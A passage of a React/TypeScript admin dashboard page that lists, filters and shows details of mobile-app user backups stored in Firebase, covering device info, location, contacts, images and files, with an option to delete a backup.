import React, { useEffect, useState, useMemo } from 'react';
import {
  Box,
  Heading,
  Card,
  Table,
  Thead,
  Tbody,
  Tr,
  Th,
  Td,
  Badge,
  IconButton,
  Menu,
  MenuButton,
  MenuList,
  MenuItem,
  Flex,
  Button,
  useToast,
  Spinner,
  Center,
  Text,
  HStack,
  VStack,
  SimpleGrid,
  Stat,
  StatLabel,
  StatNumber,
  StatHelpText,
  CardBody,
  AlertDialog,
  AlertDialogBody,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogContent,
  AlertDialogOverlay,
  Tabs,
  TabList,
  TabPanels,
  Tab,
  TabPanel,
  useDisclosure,
  Modal,
  ModalOverlay,
  ModalContent,
  ModalHeader,
  ModalBody,
  ModalCloseButton,
  ModalFooter,
  Input,
  InputGroup,
  InputLeftElement,
  Icon,
  Select,
  Tooltip,
  useColorModeValue,
} from '@chakra-ui/react';
import {
  FiMoreVertical,
  FiTrash2,
  FiRefreshCw,
  FiDatabase,
  FiEye,
  FiSearch,
  FiUsers,
  FiImage,
  FiFile,
  FiCheckCircle,
  FiAlertCircle,
  FiClock,
  FiSmartphone,
} from 'react-icons/fi';
import { collection, getDocs, doc, deleteDoc } from 'firebase/firestore';
import { db } from '@/config/firebase';
import { formatDate, formatRelativeTime } from '@/utils/helpers';

interface UserBackup {
  id: string; // Username
  device_info?: {
    // Basic Info
    platform?: string;
    brand?: string;
    manufacturer?: string;
    model?: string;
    device?: string;
    product?: string;
    display?: string;
    name?: string; // iOS device name

    // Android Version Details
    androidVersion?: string;
    sdkInt?: number;
    securityPatch?: string;
    codename?: string;
    baseOS?: string;
    incremental?: string;

    // iOS Version Details
    systemVersion?: string;
    identifierForVendor?: string;

    // Hardware Info
    hardware?: string;
    supportedAbis?: string[];
    supported32BitAbis?: string[];
    supported64BitAbis?: string[];

    // System Info
    androidId?: string;
    fingerprint?: string;
    bootloader?: string;
    board?: string;
    host?: string;
    tags?: string;
    type?: string;

    // iOS System Info (utsname)
    sysname?: string;
    nodename?: string;
    release?: string;
    version?: string;
    machine?: string;

    // Display Info
    isPhysicalDevice?: boolean;
    systemFeatures?: string[];

    // Storage Info
    totalDiskSpaceGB?: string;
    freeDiskSpaceGB?: string;
    usedDiskSpaceGB?: string;

    // App Info
    appName?: string;
    packageName?: string;
    appVersion?: string;
    buildNumber?: string;
    buildSignature?: string;

    // System Context
    timezone?: string;
    timezoneOffset?: number;
    locale?: string;
    backup_timestamp?: string;
  };
  device_info_updated_at?: any;
  location?: {
    latitude?: number;
    longitude?: number;
    address?: string;
    accuracy?: number;
    altitude?: number;
    timestamp?: string;
  };
  location_updated_at?: any;
  contacts?: any[];
  contacts_count?: number;
  contacts_updated_at?: any;
  images?: any[];
  images_count?: number;
  images_updated_at?: any;
  files?: any[];
  files_count?: number;
  files_updated_at?: any;
  last_backup_completed_at?: any;
  backup_success?: {
    device_info?: boolean;
    location?: boolean;
    contacts?: boolean;
    images?: boolean;
    files?: boolean;
  };
}

// Helper functions
const getTotalItems = (backup: UserBackup): number => {
  return (
    (backup.contacts_count || 0) +
    (backup.images_count || 0) +
    (backup.files_count || 0)
  );
};

const getBackupStatus = (backup: UserBackup): 'complete' | 'partial' | 'pending' => {
  if (!backup.backup_success) return 'pending';
  const success = backup.backup_success;
  const allSuccess = success.device_info && success.location && success.contacts && success.images && success.files;
  const someSuccess = success.device_info || success.location || success.contacts || success.images || success.files;
  return allSuccess ? 'complete' : someSuccess ? 'partial' : 'pending';
};

const getStatusColor = (status: string) => {
  switch (status) {
    case 'complete':
      return 'green';
    case 'partial':
      return 'yellow';
    case 'pending':
      return 'gray';
    default:
      return 'gray';
  }
};

const Backups: React.FC = () => {
  const [backups, setBackups] = useState<UserBackup[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedBackup, setSelectedBackup] = useState<UserBackup | null>(null);
  const [isDeleteOpen, setIsDeleteOpen] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [platformFilter, setPlatformFilter] = useState<'all' | 'android' | 'ios'>('all');
  const [statusFilter, setStatusFilter] = useState<'all' | 'complete' | 'partial' | 'pending'>('all');
  const { isOpen, onOpen, onClose } = useDisclosure();
  const cancelRef = React.useRef<HTMLButtonElement>(null);

  const toast = useToast();
  const cardBg = useColorModeValue('white', 'gray.800');

  // Calculate statistics
  const statistics = useMemo(() => {
    // Safety check: ensure backups is an array
    const safeBackups = Array.isArray(backups) ? backups : [];

    const totalUsers = safeBackups.length;
    const totalContacts = safeBackups.reduce((sum, b) => sum + (b.contacts_count || 0), 0);
    const totalImages = safeBackups.reduce((sum, b) => sum + (b.images_count || 0), 0);
    const totalFiles = safeBackups.reduce((sum, b) => sum + (b.files_count || 0), 0);

    const completeBackups = safeBackups.filter((b) => getBackupStatus(b) === 'complete').length;
    const partialBackups = safeBackups.filter((b) => getBackupStatus(b) === 'partial').length;
    const pendingBackups = safeBackups.filter((b) => getBackupStatus(b) === 'pending').length;

    const androidUsers = safeBackups.filter(
      (b) => b.device_info?.platform?.toLowerCase() === 'android'
    ).length;
    const iosUsers = safeBackups.filter(
      (b) => b.device_info?.platform?.toLowerCase() === 'ios'
    ).length;

    return {
      totalUsers,
      totalContacts,
      totalImages,
      totalFiles,
      completeBackups,
      partialBackups,
      pendingBackups,
      androidUsers,
      iosUsers,
      avgItemsPerUser: totalUsers > 0
        ? Math.round((totalContacts + totalImages + totalFiles) / totalUsers)
        : 0,
    };
  }, [backups]);

  // Filter backups
  const filteredBackups = useMemo(() => {
    // Safety check: ensure backups is an array
    const safeBackups = Array.isArray(backups) ? backups : [];

    return safeBackups.filter((backup) => {
      // Search filter
      const matchesSearch =
        searchTerm === '' ||
        backup.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
        backup.device_info?.brand?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        backup.device_info?.model?.toLowerCase().includes(searchTerm.toLowerCase());

      // Platform filter
      const matchesPlatform =
        platformFilter === 'all' ||
        backup.device_info?.platform?.toLowerCase() === platformFilter;

      // Status filter
      const matchesStatus = statusFilter === 'all' || getBackupStatus(backup) === statusFilter;

      return matchesSearch && matchesPlatform && matchesStatus;
    });
  }, [backups, searchTerm, platformFilter, statusFilter]);

  useEffect(() => {
    fetchBackups();
  }, []);

  const fetchBackups = async () => {
    try {
      setLoading(true);
      const backupsRef = collection(db, 'backups');
      const snapshot = await getDocs(backupsRef);

      const fetchedBackups = snapshot.docs.map((doc) => ({
        id: doc.id,
        ...doc.data(),
      })) as UserBackup[];

      setBackups(fetchedBackups);
    } catch (error) {
      console.error('Error fetching backups:', error);
      setBackups([]);
    } finally {
      setLoading(false);
    }
  };

  const handleViewBackup = (backup: UserBackup) => {
    setSelectedBackup(backup);
    onOpen();
  };

  const handleDeleteBackup = async () => {
    if (!selectedBackup) return;

    try {
      const backupRef = doc(db, 'backups', selectedBackup.id);
      await deleteDoc(backupRef);

      toast({
        title: 'Backup deleted',
        description: 'The backup has been deleted successfully',
        status: 'success',
        duration: 3000,
        isClosable: true,
      });

      setIsDeleteOpen(false);
      fetchBackups();
    } catch (error) {
      console.error('Error deleting backup:', error);
      toast({
        title: 'Delete failed',
        description: 'Failed to delete backup',
        status: 'error',
        duration: 5000,
        isClosable: true,
      });
    }
  };

  if (loading) {
    return (
      <Center h="50vh">
        <Spinner size="xl" color="brand.500" thickness="4px" />
      </Center>
    );
  }

  return (
    <Box>
      {/* Header */}
      <Flex justify="space-between" align="center" mb="6">
        <Box>
          <HStack spacing="3" mb="2">
            <Icon as={FiDatabase} boxSize="8" color="purple.500" />
            <Heading size="xl" fontWeight="extrabold">
              User Backups
            </Heading>
          </HStack>
          <Text color="gray.600" fontSize="md">
            Manage and monitor user data backups
          </Text>
        </Box>
        <HStack>
          <Button leftIcon={<FiRefreshCw />} onClick={fetchBackups} colorScheme="purple" size="lg">
            Refresh
          </Button>
        </HStack>
      </Flex>

      {/* Statistics */}
      <SimpleGrid columns={{ base: 1, md: 2, lg: 4 }} spacing="6" mb="6">
        <Card
          bg={cardBg}
          shadow="md"
          transition="all 0.3s"
          _hover={{ shadow: 'xl', transform: 'translateY(-4px)' }}
        >
          <CardBody>
            <Stat>
              <Flex align="center" justify="space-between" mb="2">
                <StatLabel fontSize="sm" fontWeight="medium" color="gray.600">
                  Total Users
                </StatLabel>
                <Icon
                  as={FiUsers}
                  boxSize="10"
                  color="purple.500"
                  bg="purple.50"
                  p="2"
                  borderRadius="lg"
                />
              </Flex>
              <StatNumber fontSize="4xl" fontWeight="extrabold" color="purple.500">
                {statistics.totalUsers}
              </StatNumber>
              <StatHelpText fontSize="sm">With backups</StatHelpText>
            </Stat>
          </CardBody>
        </Card>

        <Card
          bg={cardBg}
          shadow="md"
          transition="all 0.3s"
          _hover={{ shadow: 'xl', transform: 'translateY(-4px)' }}
        >
          <CardBody>
            <Stat>
              <Flex align="center" justify="space-between" mb="2">
                <StatLabel fontSize="sm" fontWeight="medium" color="gray.600">
                  Total Contacts
                </StatLabel>
                <Icon
                  as={FiUsers}
                  boxSize="10"
                  color="blue.500"
                  bg="blue.50"
                  p="2"
                  borderRadius="lg"
                />
              </Flex>
              <StatNumber fontSize="4xl" fontWeight="extrabold" color="blue.500">
                {statistics.totalContacts.toLocaleString()}
              </StatNumber>
              <StatHelpText fontSize="sm">Backed up</StatHelpText>
            </Stat>
          </CardBody>
        </Card>

        <Card
          bg={cardBg}
          shadow="md"
          transition="all 0.3s"
          _hover={{ shadow: 'xl', transform: 'translateY(-4px)' }}
        >
          <CardBody>
            <Stat>
              <Flex align="center" justify="space-between" mb="2">
                <StatLabel fontSize="sm" fontWeight="medium" color="gray.600">
                  Total Images
                </StatLabel>
                <Icon
                  as={FiImage}
                  boxSize="10"
                  color="green.500"
                  bg="green.50"
                  p="2"
                  borderRadius="lg"
                />
              </Flex>
              <StatNumber fontSize="4xl" fontWeight="extrabold" color="green.500">
                {statistics.totalImages.toLocaleString()}
              </StatNumber>
              <StatHelpText fontSize="sm">Backed up</StatHelpText>
            </Stat>
          </CardBody>
        </Card>

        <Card
          bg={cardBg}
          shadow="md"
          transition="all 0.3s"
          _hover={{ shadow: 'xl', transform: 'translateY(-4px)' }}
        >
          <CardBody>
            <Stat>
              <Flex align="center" justify="space-between" mb="2">
                <StatLabel fontSize="sm" fontWeight="medium" color="gray.600">
                  Total Files
                </StatLabel>
                <Icon
                  as={FiFile}
                  boxSize="10"
                  color="orange.500"
                  bg="orange.50"
                  p="2"
                  borderRadius="lg"
                />
              </Flex>
              <StatNumber fontSize="4xl" fontWeight="extrabold" color="orange.500">
                {statistics.totalFiles.toLocaleString()}
              </StatNumber>
              <StatHelpText fontSize="sm">Videos & others</StatHelpText>
            </Stat>
          </CardBody>
        </Card>
      </SimpleGrid>

      {/* Additional Statistics Row */}
      <SimpleGrid columns={{ base: 1, md: 3, lg: 6 }} spacing="4" mb="6">
        <Card bg={cardBg} shadow="sm">
          <CardBody py="4">
            <Flex align="center" justify="space-between">
              <VStack align="start" spacing="0">
                <Text fontSize="xs" color="gray.600" fontWeight="medium">
                  Complete
                </Text>
                <Text fontSize="2xl" fontWeight="bold" color="green.500">
                  {statistics.completeBackups}
                </Text>
              </VStack>
              <Icon as={FiCheckCircle} boxSize="6" color="green.500" />
            </Flex>
          </CardBody>
        </Card>

        <Card bg={cardBg} shadow="sm">
          <CardBody py="4">
            <Flex align="center" justify="space-between">
              <VStack align="start" spacing="0">
                <Text fontSize="xs" color="gray.600" fontWeight="medium">
                  Partial
                </Text>
                <Text fontSize="2xl" fontWeight="bold" color="yellow.500">
                  {statistics.partialBackups}
                </Text>
              </VStack>
              <Icon as={FiAlertCircle} boxSize="6" color="yellow.500" />
            </Flex>
          </CardBody>
        </Card>

        <Card bg={cardBg} shadow="sm">
          <CardBody py="4">
            <Flex align="center" justify="space-between">
              <VStack align="start" spacing="0">
                <Text fontSize="xs" color="gray.600" fontWeight="medium">
                  Pending
                </Text>
                <Text fontSize="2xl" fontWeight="bold" color="gray.500">
                  {statistics.pendingBackups}
                </Text>
              </VStack>
              <Icon as={FiClock} boxSize="6" color="gray.500" />
            </Flex>
          </CardBody>
        </Card>

        <Card bg={cardBg} shadow="sm">
          <CardBody py="4">
            <Flex align="center" justify="space-between">
              <VStack align="start" spacing="0">
                <Text fontSize="xs" color="gray.600" fontWeight="medium">
                  Android
                </Text>
                <Text fontSize="2xl" fontWeight="bold" color="green.600">
                  {statistics.androidUsers}
                </Text>
              </VStack>
              <Icon as={FiSmartphone} boxSize="6" color="green.600" />
            </Flex>
          </CardBody>
        </Card>

        <Card bg={cardBg} shadow="sm">
          <CardBody py="4">
            <Flex align="center" justify="space-between">
              <VStack align="start" spacing="0">
                <Text fontSize="xs" color="gray.600" fontWeight="medium">
                  iOS
                </Text>
                <Text fontSize="2xl" fontWeight="bold" color="blue.600">
                  {statistics.iosUsers}
                </Text>
              </VStack>
              <Icon as={FiSmartphone} boxSize="6" color="blue.600" />
            </Flex>
          </CardBody>
        </Card>

        <Card bg={cardBg} shadow="sm">
          <CardBody py="4">
            <Flex align="center" justify="space-between">
              <VStack align="start" spacing="0">
                <Text fontSize="xs" color="gray.600" fontWeight="medium">
                  Avg Items
                </Text>
                <Text fontSize="2xl" fontWeight="bold" color="purple.500">
                  {statistics.avgItemsPerUser.toLocaleString()}
                </Text>
              </VStack>
              <Icon as={FiDatabase} boxSize="6" color="purple.500" />
            </Flex>
          </CardBody>
        </Card>
      </SimpleGrid>

      {/* Search and Filters */}
      <Card mb="6" bg={cardBg}>
        <CardBody>
          <Flex gap="4" flexWrap="wrap" align="center">
            <InputGroup maxW="400px" flex="1">
              <InputLeftElement pointerEvents="none">
                <Icon as={FiSearch} color="gray.400" />
              </InputLeftElement>
              <Input
                placeholder="Search by username, brand, or model..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                size="md"
              />
            </InputGroup>

            <Select
              value={platformFilter}
              onChange={(e) => setPlatformFilter(e.target.value as any)}
              maxW="200px"
              size="md"
            >
              <option value="all">All Platforms</option>
              <option value="android">Android</option>
              <option value="ios">iOS</option>
            </Select>

            <Select
              value={statusFilter}
              onChange={(e) => setStatusFilter(e.target.value as any)}
              maxW="200px"
              size="md"
            >
              <option value="all">All Status</option>
              <option value="complete">Complete</option>
              <option value="partial">Partial</option>
              <option value="pending">Pending</option>
            </Select>

            <Badge colorScheme="purple" fontSize="md" px="3" py="1" borderRadius="full">
              {filteredBackups.length} results
            </Badge>
          </Flex>
        </CardBody>
      </Card>

      {/* Backups Table */}
      <Card>
        <Box overflowX="auto">
          {filteredBackups.length > 0 ? (
            <Table variant="simple">
              <Thead bg="gray.50">
                <Tr>
                  <Th>User</Th>
                  <Th>Platform</Th>
                  <Th>Device</Th>
                  <Th>Items Backed Up</Th>
                  <Th>Last Backup</Th>
                  <Th>Status</Th>
                  <Th>Actions</Th>
                </Tr>
              </Thead>
              <Tbody>
                {filteredBackups.map((backup) => (
                <Tr
                  key={backup.id}
                  _hover={{ bg: 'gray.50' }}
                  transition="all 0.2s"
                  cursor="pointer"
                >
                  <Td>
                    <VStack align="start" spacing="0">
                      <Text fontWeight="semibold" fontSize="md">
                        {backup.id.replace(/_/g, ' ')}
                      </Text>
                      <Text fontSize="xs" color="gray.500">
                        ID: {backup.id}
                      </Text>
                    </VStack>
                  </Td>
                  <Td>
                    {backup.device_info?.platform ? (
                      <Badge
                        colorScheme={
                          backup.device_info.platform.toLowerCase() === 'android' ? 'green' : 'blue'
                        }
                        fontSize="sm"
                        px="3"
                        py="1"
                        borderRadius="full"
                      >
                        {backup.device_info.platform}
                      </Badge>
                    ) : (
                      <Text fontSize="sm" color="gray.400">
                        Unknown
                      </Text>
                    )}
                  </Td>
                  <Td>
                    {backup.device_info ? (
                      <VStack align="start" spacing="1">
                        <Text fontSize="sm" fontWeight="medium">
                          {backup.device_info.brand} {backup.device_info.name || backup.device_info.model}
                        </Text>
                        <HStack spacing="2">
                          {backup.device_info.androidVersion && (
                            <Badge size="sm" colorScheme="gray" fontSize="xs">
                              Android {backup.device_info.androidVersion}
                            </Badge>
                          )}
                          {backup.device_info.systemVersion && (
                            <Badge size="sm" colorScheme="gray" fontSize="xs">
                              iOS {backup.device_info.systemVersion}
                            </Badge>
                          )}
                        </HStack>
                      </VStack>
                    ) : (
                      <Text fontSize="sm" color="gray.400">
                        No device info
                      </Text>
                    )}
                  </Td>
                  <Td>
                    <VStack align="start" spacing="2">
                      <HStack>
                        <Text fontSize="lg" fontWeight="bold" color="purple.500">
                          {getTotalItems(backup).toLocaleString()}
                        </Text>
                        <Text fontSize="sm" color="gray.600">
                          items
                        </Text>
                      </HStack>
                      <HStack spacing="3" fontSize="xs" color="gray.600">
                        <Tooltip label="Contacts" hasArrow>
                          <HStack spacing="1">
                            <Icon as={FiUsers} color="blue.500" />
                            <Text>{backup.contacts_count || 0}</Text>
                          </HStack>
                        </Tooltip>
                        <Tooltip label="Images" hasArrow>
                          <HStack spacing="1">
                            <Icon as={FiImage} color="green.500" />
                            <Text>{backup.images_count || 0}</Text>
                          </HStack>
                        </Tooltip>
                        <Tooltip label="Files" hasArrow>
                          <HStack spacing="1">
                            <Icon as={FiFile} color="orange.500" />
                            <Text>{backup.files_count || 0}</Text>
                          </HStack>
                        </Tooltip>
                      </HStack>
                    </VStack>
                  </Td>
                  <Td>
                    {backup.last_backup_completed_at ? (
                      <VStack align="start" spacing="0">
                        <Tooltip
                          label={formatDate(backup.last_backup_completed_at)}
                          hasArrow
                        >
                          <Text fontSize="sm" fontWeight="medium">
                            {formatDate(backup.last_backup_completed_at, 'MMM dd, HH:mm')}
                          </Text>
                        </Tooltip>
                        <HStack spacing="1">
                          <Icon as={FiClock} boxSize="3" color="gray.500" />
                          <Text fontSize="xs" color="gray.500">
                            {formatRelativeTime(backup.last_backup_completed_at)}
                          </Text>
                        </HStack>
                      </VStack>
                    ) : (
                      <Text fontSize="sm" color="gray.400">
                        Never
                      </Text>
                    )}
                  </Td>
                  <Td>
                    <Badge
                      colorScheme={getStatusColor(getBackupStatus(backup))}
                      fontSize="sm"
                      px="3"
                      py="1"
                      borderRadius="full"
                      textTransform="capitalize"
                    >
                      {getBackupStatus(backup)}
                    </Badge>
                  </Td>
                  <Td>
                    <HStack spacing="2">
                      <Tooltip label="View Details" hasArrow>
                        <IconButton
                          icon={<FiEye />}
                          variant="ghost"
                          size="sm"
                          colorScheme="purple"
                          onClick={() => handleViewBackup(backup)}
                          aria-label="View details"
                        />
                      </Tooltip>
                      <Menu>
                        <MenuButton
                          as={IconButton}
                          icon={<FiMoreVertical />}
                          variant="ghost"
                          size="sm"
                        />
                        <MenuList>
                          <MenuItem icon={<FiEye />} onClick={() => handleViewBackup(backup)}>
                            View Details
                          </MenuItem>
                          <MenuItem
                            icon={<FiTrash2 />}
                            color="red.500"
                            onClick={() => {
                              setSelectedBackup(backup);
                              setIsDeleteOpen(true);
                            }}
                          >
                            Delete Backup
                          </MenuItem>
                        </MenuList>
                      </Menu>
                    </HStack>
                  </Td>
                </Tr>
              ))}
            </Tbody>
          </Table>
          ) : (
            <Center h="30vh">
              <VStack spacing="3">
                <Icon as={FiDatabase} boxSize="12" color="gray.400" />
                <Text color="gray.500" fontSize="lg" fontWeight="medium">
                  {backups.length === 0 ? 'No backups found' : 'No results found'}
                </Text>
                <Text fontSize="sm" color="gray.400" textAlign="center" maxW="md">
                  {backups.length === 0
                    ? "Users' backups will appear here when they create them from the mobile app"
                    : 'Try adjusting your search or filter criteria'}
                </Text>
              </VStack>
            </Center>
          )}
        </Box>
      </Card>

      {/* View Backup Details Modal */}
      <Modal isOpen={isOpen} onClose={onClose} size="6xl">
        <ModalOverlay backdropFilter="blur(4px)" />
        <ModalContent maxH="85vh" overflowY="auto" borderRadius="xl">
          <ModalHeader bg="gray.50" borderTopRadius="xl" py="6">
            <VStack align="stretch" spacing="3">
              <HStack justify="space-between" align="center">
                <HStack spacing="3">
                  <Icon as={FiDatabase} boxSize="8" color="purple.500" />
                  <VStack align="start" spacing="0">
                    <Text fontSize="2xl" fontWeight="bold">
                      {selectedBackup?.id.replace(/_/g, ' ')}
                    </Text>
                    <Text fontSize="sm" color="gray.600" fontWeight="normal">
                      Backup Details
                    </Text>
                  </VStack>
                </HStack>
                <ModalCloseButton position="relative" top="0" right="0" />
              </HStack>
              <HStack spacing="2" flexWrap="wrap">
                {selectedBackup?.device_info?.platform && (
                  <Badge
                    colorScheme={
                      selectedBackup?.device_info?.platform?.toLowerCase() === 'android'
                        ? 'green'
                        : 'blue'
                    }
                    fontSize="sm"
                    px="3"
                    py="1"
                    borderRadius="full"
                  >
                    {selectedBackup?.device_info?.platform}
                  </Badge>
                )}
                {selectedBackup && (
                  <>
                    <Badge colorScheme="purple" fontSize="sm" px="3" py="1" borderRadius="full">
                      {getTotalItems(selectedBackup).toLocaleString()} items
                    </Badge>
                    <Badge
                      colorScheme={getStatusColor(getBackupStatus(selectedBackup))}
                      fontSize="sm"
                      px="3"
                      py="1"
                      borderRadius="full"
                    >
                      {getBackupStatus(selectedBackup)}
                    </Badge>
                  </>
                )}
              </HStack>
            </VStack>
          </ModalHeader>
          <ModalBody pb="6" bg="gray.50">
            {selectedBackup && (
              <Tabs colorScheme="purple" variant="enclosed">
                <TabList>
                  <Tab>Overview</Tab>
                  <Tab>Device Info</Tab>
                  <Tab>Location</Tab>
                  <Tab>
                    <HStack>
                      <Icon as={FiUsers} />
                      <Text>Contacts</Text>
                      <Badge>{selectedBackup.contacts_count || 0}</Badge>
                    </HStack>
                  </Tab>
                  <Tab>
                    <HStack>
                      <Icon as={FiImage} />
                      <Text>Images</Text>
                      <Badge>{selectedBackup.images_count || 0}</Badge>
                    </HStack>
                  </Tab>
                  <Tab>
                    <HStack>
                      <Icon as={FiFile} />
                      <Text>Files</Text>
                      <Badge>{selectedBackup.files_count || 0}</Badge>
                    </HStack>
                  </Tab>
                </TabList>

                <TabPanels>
                  {/* Overview Tab */}
                  <TabPanel>
                    <VStack spacing="6" align="stretch">
                      <SimpleGrid columns={{ base: 1, md: 2 }} spacing="6">
                        <Card bg="white" shadow="sm">
                          <CardBody>
                            <VStack align="start" spacing="2">
                              <HStack>
                                <Icon as={FiClock} color="purple.500" boxSize="5" />
                                <Text fontWeight="bold" fontSize="md" color="gray.700">
                                  Last Backup
                                </Text>
                              </HStack>
                              <Text fontSize="lg" fontWeight="semibold">
                                {selectedBackup.last_backup_completed_at
                                  ? formatDate(selectedBackup.last_backup_completed_at)
                                  : 'Never'}
                              </Text>
                              {selectedBackup.last_backup_completed_at && (
                                <Text fontSize="sm" color="gray.600">
                                  {formatRelativeTime(selectedBackup.last_backup_completed_at)}
                                </Text>
                              )}
                            </VStack>
                          </CardBody>
                        </Card>

                        <Card bg="white" shadow="sm">
                          <CardBody>
                            <VStack align="start" spacing="2">
                              <HStack>
                                <Icon
                                  as={
                                    getBackupStatus(selectedBackup) === 'complete'
                                      ? FiCheckCircle
                                      : FiAlertCircle
                                  }
                                  color={`${getStatusColor(getBackupStatus(selectedBackup))}.500`}
                                  boxSize="5"
                                />
                                <Text fontWeight="bold" fontSize="md" color="gray.700">
                                  Status
                                </Text>
                              </HStack>
                              <Badge
                                colorScheme={getStatusColor(getBackupStatus(selectedBackup))}
                                fontSize="md"
                                px="4"
                                py="1"
                                borderRadius="full"
                                textTransform="capitalize"
                              >
                                {getBackupStatus(selectedBackup)}
                              </Badge>
                            </VStack>
                          </CardBody>
                        </Card>
                      </SimpleGrid>

                      {/* Backup Items Summary */}
                      <Card bg="white" shadow="sm">
                        <CardBody>
                          <Text fontWeight="bold" fontSize="md" color="gray.700" mb="4">
                            Backup Items Summary
                          </Text>
                          <SimpleGrid columns={{ base: 2, md: 4 }} spacing="6">
                            <VStack>
                              <Icon as={FiUsers} boxSize="10" color="blue.500" />
                              <Text fontSize="3xl" fontWeight="bold" color="blue.500">
                                {selectedBackup.contacts_count || 0}
                              </Text>
                              <Text fontSize="sm" color="gray.600">
                                Contacts
                              </Text>
                            </VStack>
                            <VStack>
                              <Icon as={FiImage} boxSize="10" color="green.500" />
                              <Text fontSize="3xl" fontWeight="bold" color="green.500">
                                {selectedBackup.images_count || 0}
                              </Text>
                              <Text fontSize="sm" color="gray.600">
                                Images
                              </Text>
                            </VStack>
                            <VStack>
                              <Icon as={FiFile} boxSize="10" color="orange.500" />
                              <Text fontSize="3xl" fontWeight="bold" color="orange.500">
                                {selectedBackup.files_count || 0}
                              </Text>
                              <Text fontSize="sm" color="gray.600">
                                Files
                              </Text>
                            </VStack>
                            <VStack>
                              <Icon as={FiDatabase} boxSize="10" color="purple.500" />
                              <Text fontSize="3xl" fontWeight="bold" color="purple.500">
                                {getTotalItems(selectedBackup)}
                              </Text>
                              <Text fontSize="sm" color="gray.600">
                                Total Items
                              </Text>
                            </VStack>
                          </SimpleGrid>
                        </CardBody>
                      </Card>

                      {/* Components Status */}
                      {selectedBackup.backup_success && (
                        <Card bg="white" shadow="sm">
                          <CardBody>
                            <Text fontWeight="bold" fontSize="md" color="gray.700" mb="4">
                              Backup Components Status
                            </Text>
                            <SimpleGrid columns={{ base: 1, md: 2 }} spacing="4">
                              {Object.entries(selectedBackup.backup_success).map(
                                ([key, value]) => (
                                  <Flex
                                    key={key}
                                    align="center"
                                    justify="space-between"
                                    p="3"
                                    bg="gray.50"
                                    borderRadius="md"
                                    border="1px"
                                    borderColor={value ? 'green.200' : 'red.200'}
                                  >
                                    <HStack spacing="3">
                                      <Icon
                                        as={value ? FiCheckCircle : FiAlertCircle}
                                        color={value ? 'green.500' : 'red.500'}
                                        boxSize="5"
                                      />
                                      <Text textTransform="capitalize" fontWeight="medium">
                                        {key.replace('_', ' ')}
                                      </Text>
                                    </HStack>
                                    <Badge
                                      colorScheme={value ? 'green' : 'red'}
                                      fontSize="sm"
                                      px="3"
                                      py="1"
                                      borderRadius="full"
                                    >
                                      {value ? 'Success' : 'Failed'}
                                    </Badge>
                                  </Flex>
                                )
                              )}
                            </SimpleGrid>
                          </CardBody>
                        </Card>
                      )}
                    </VStack>
                  </TabPanel>

                  {/* Device Info Tab */}
                  <TabPanel>
                    {selectedBackup.device_info ? (
                      <VStack spacing="6" align="stretch">
                        {/* Basic Information Section */}
                        <Box>
                          <Text fontWeight="bold" fontSize="md" mb="3" color="brand.600">
                            📱 Basic Information
                          </Text>
                          <SimpleGrid columns={2} spacing="4" p="4" bg="gray.50" borderRadius="md">
                            <Box>
                              <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Platform</Text>
                              <Text>{selectedBackup.device_info.platform || 'N/A'}</Text>
                            </Box>
                            <Box>
                              <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Brand</Text>
                              <Text>{selectedBackup.device_info.brand || 'N/A'}</Text>
                            </Box>
                            <Box>
                              <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Manufacturer</Text>
                              <Text>{selectedBackup.device_info.manufacturer || 'N/A'}</Text>
                            </Box>
                            <Box>
                              <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Model</Text>
                              <Text>{selectedBackup.device_info.model || 'N/A'}</Text>
                            </Box>
                            <Box>
                              <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Device</Text>
                              <Text>{selectedBackup.device_info.device || 'N/A'}</Text>
                            </Box>
                            <Box>
                              <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Product</Text>
                              <Text>{selectedBackup.device_info.product || 'N/A'}</Text>
                            </Box>
                            {selectedBackup.device_info.name && (
                              <Box>
                                <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Device Name</Text>
                                <Text>{selectedBackup.device_info.name}</Text>
                              </Box>
                            )}
                            <Box>
                              <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Physical Device</Text>
                              <Badge colorScheme={selectedBackup.device_info.isPhysicalDevice ? 'green' : 'orange'}>
                                {selectedBackup.device_info.isPhysicalDevice ? 'Yes' : 'Emulator'}
                              </Badge>
                            </Box>
                          </SimpleGrid>
                        </Box>

                        {/* Version Details Section */}
                        {(selectedBackup.device_info.platform === 'Android' ?
                          selectedBackup.device_info.androidVersion :
                          selectedBackup.device_info.systemVersion) && (
                          <Box>
                            <Text fontWeight="bold" fontSize="md" mb="3" color="brand.600">
                              🔢 Version Details
                            </Text>
                            <SimpleGrid columns={2} spacing="4" p="4" bg="gray.50" borderRadius="md">
                              {selectedBackup.device_info.platform === 'Android' ? (
                                <>
                                  <Box>
                                    <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Android Version</Text>
                                    <Text>{selectedBackup.device_info.androidVersion || 'N/A'}</Text>
                                  </Box>
                                  <Box>
                                    <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">SDK Int</Text>
                                    <Badge colorScheme="purple">{selectedBackup.device_info.sdkInt || 'N/A'}</Badge>
                                  </Box>
                                  <Box>
                                    <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Security Patch</Text>
                                    <Text fontSize="sm">{selectedBackup.device_info.securityPatch || 'N/A'}</Text>
                                  </Box>
                                  <Box>
                                    <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Codename</Text>
                                    <Text>{selectedBackup.device_info.codename || 'N/A'}</Text>
                                  </Box>
                                  <Box>
                                    <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Base OS</Text>
                                    <Text fontSize="sm">{selectedBackup.device_info.baseOS || 'N/A'}</Text>
                                  </Box>
                                  <Box>
                                    <Text fontWeight="bold" fontSize="sm" color="gray.600" mb="1">Incremental</Text>
                                    <Text fontSize="sm">{selectedBackup.device_info.incremental || 'N/A'}</Text>
                                  </Box>
                                </>
                              ) : (
